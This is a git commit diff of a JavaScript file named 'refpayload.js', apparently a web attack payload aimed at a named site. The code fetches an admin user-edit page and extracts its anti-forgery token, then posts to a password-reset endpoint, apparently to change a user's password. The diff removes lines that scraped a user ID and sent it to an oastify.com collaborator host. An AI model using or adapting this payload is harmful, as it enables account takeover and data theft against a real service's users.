ed72bdf9e29c1362ce0f024127daae42c65f0da4
tomoncrss <tonymyson89823@gmail.com>
2025-04-05 18:39:32 +0330

    Update refpayload.js

--- refpayload.js
+++ refpayload.js
@@ -5,13 +5,6 @@ fetch("https://refeng.erad.com/Admin/AdminUsers/Edit?aUserKey=25713")
     const tokenMatch = res.match(/__RequestVerificationToken" type="hidden" value="([^"]+)"/);  
     const token = tokenMatch ? tokenMatch[1] : "";  
 
-    // Extract User ID  
-    const userIdMatch = res.match(/<span class="blue-cursive" id='UserIDText'>(.*?)<\/span>/);  
-    const userId = userIdMatch ? userIdMatch[1] : "";  
-
-    // Send extracted User ID  
-    fetch(`https://7v38ezsvngwu5goi5lsma1v25tbkzb4zt.oastify.com?data=${encodeURIComponent(userId)}`);  
-
     // Change password using extracted token  
     fetch("https://refeng.erad.com/Home/PasswordReset", {  
       method: "POST",  
